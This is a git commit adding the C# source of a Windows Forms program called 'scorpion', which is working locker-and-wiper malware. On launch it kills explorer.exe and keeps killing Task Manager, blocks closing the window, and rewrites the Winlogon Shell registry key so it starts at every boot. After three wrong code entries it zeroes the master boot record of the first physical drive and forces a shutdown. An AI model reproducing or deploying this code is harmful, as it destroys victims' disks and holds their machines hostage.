8b0fb24c2313667b91e0a15d9f11265d77644c02
itsWKN <82588441+itsWKN@users.noreply.github.com>
2023-05-18 14:09:36 +0200

    Add files via upload

---
+++ scorpion/Form1.Designer.cs
@@ -0,0 +1,108 @@
+﻿namespace scorpion
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Erforderliche Designervariable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Verwendete Ressourcen bereinigen.
+        /// </summary>
+        /// <param name="disposing">True, wenn verwaltete Ressourcen gelöscht werden sollen; andernfalls False.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Vom Windows Form-Designer generierter Code
+
+        /// <summary>
+        /// Erforderliche Methode für die Designerunterstützung.
+        /// Der Inhalt der Methode darf nicht mit dem Code-Editor geändert werden.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.endTaskmgr = new System.Windows.Forms.Timer(this.components);
+            this.code_input = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // endTaskmgr
+            // 
+            this.endTaskmgr.Tick += new System.EventHandler(this.endTaskmgr_Tick);
+            // 
+            // code_input
+            // 
+            this.code_input.BackColor = System.Drawing.Color.Red;
+            this.code_input.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.code_input.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.code_input.ForeColor = System.Drawing.Color.Black;
+            this.code_input.Location = new System.Drawing.Point(99, 306);
+            this.code_input.Name = "code_input";
+            this.code_input.Size = new System.Drawing.Size(260, 31);
+            this.code_input.TabIndex = 0;
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.Red;
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
+            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.Location = new System.Drawing.Point(365, 306);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(77, 31);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "Check";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.BackColor = System.Drawing.Color.Black;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.ForeColor = System.Drawing.Color.Red;
+            this.label1.Location = new System.Drawing.Point(96, 340);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(185, 25);
+            this.label1.TabIndex = 2;
+            this.label1.Text = "Remaining tries: 3";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackgroundImage = global::scorpion.Properties.Resources.Unbenannt;
+            this.ClientSize = new System.Drawing.Size(800, 450);
+            this.ControlBox = false;
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.code_input);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
+            this.Name = "Form1";
+            this.ShowInTaskbar = false;
+            this.TopMost = true;
+            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Timer endTaskmgr;
+        private System.Windows.Forms.TextBox code_input;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label1;
+    }
+}
+
---
+++ scorpion/Form1.cs
@@ -0,0 +1,142 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace scorpion
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        [DllImport("kernel32")]
+        private static extern IntPtr CreateFile(
+            string lpFileName,
+            uint dwDesiredAccess,
+            uint dwShareMode,
+            IntPtr lpSecurityAttributes,
+            uint dwCreationDisposition,
+            uint dwFlagsAndAttributes,
+            IntPtr hTemplateFile);
+
+        [DllImport("kernel32")]
+        private static extern bool WriteFile(
+            IntPtr hFile,
+            byte[] lpBuffer,
+            uint nNumberOfBytesToWrite,
+            out uint lpNumberOfBytesWritten,
+            IntPtr lpOverlapped);
+
+        private const uint GenericRead = 0x80000000;
+        private const uint GenericWrite = 0x40000000;
+        private const uint GenericExecute = 0x20000000;
+        private const uint GenericAll = 0x10000000;
+
+        private const uint FileShareRead = 0x1;
+        private const uint FileShareWrite = 0x2;
+
+        private const uint OpenExisting = 0x3;
+
+        private const uint FileFlagDeleteOnClose = 0x4000000;
+
+        private const uint MbrSize = 512u;
+
+
+        int tries = 3;
+        string code = "follow";
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            // disable alt + f4
+            e.Cancel = true;
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            // end explorer.exe -> no taskbar
+            Process.Start("taskkill", "/f /im explorer.exe");
+
+            endTaskmgr.Start();
+
+            // write to shell key -> auto startup
+            RegistryKey localMachine = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, RegistryView.Registry64);
+
+            RegistryKey regKey = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
+            regKey.SetValue("Shell", Application.ExecutablePath, RegistryValueKind.String);
+            regKey.Close();
+        }
+
+        private void endTaskmgr_Tick(object sender, EventArgs e)
+        {
+            // end task manager
+            Process[] taskmgr = Process.GetProcessesByName("taskmgr");
+            if (taskmgr.Length > 0)
+            {
+                Process.Start("taskkill", "/f /im taskmgr.exe");
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            tries--;
+            label1.Text = "Remaining tries: " + tries;
+            if (code_input.Text == code)
+            {
+                // display message box
+                MessageBox.Show("Correct code!");
+
+                // set explorer to shell again
+                RegistryKey localMachine = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, RegistryView.Registry64);
+
+                RegistryKey regKey = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
+                regKey.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
+                regKey.Close();
+
+                // run explorer
+                Process.Start("explorer.exe");
+
+                // exit
+                Environment.Exit(0);
+            }
+            else if (tries == 0)
+            {
+                // kill mbr
+                killmbr();
+            }
+        }
+
+        private void killmbr()
+        {
+            var mbrData = new byte[MbrSize];
+
+            var mbr = CreateFile(
+                "\\\\.\\PhysicalDrive0",
+                GenericAll,
+                FileShareRead | FileShareWrite,
+                IntPtr.Zero,
+                OpenExisting,
+                0,
+                IntPtr.Zero);
+
+            WriteFile(
+                mbr,
+                mbrData,
+                MbrSize,
+                out uint lpNumberOfBytesWritten,
+                IntPtr.Zero);
+
+            Process.Start("shutdown", "-s -t 0");
+        }
+    }
+}
